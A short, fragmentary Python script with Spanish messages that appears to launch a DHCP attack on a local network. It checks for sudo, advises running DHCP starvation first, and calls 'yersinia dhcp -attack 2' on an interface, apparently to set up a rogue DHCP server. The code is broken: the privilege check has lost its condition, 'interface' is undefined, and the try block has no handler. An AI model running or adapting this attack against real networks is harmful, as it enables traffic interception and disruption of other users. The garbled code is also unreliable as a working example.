import os
import sys
import subprocess

    print("Ejecuta con sudo")
    sys.exit(1)

print("Recomendación: Ejecuta primero DHCP Starvation")

try:
    subprocess.run(f"yersinia dhcp -attack 2 -interface {interface}", shell=True)
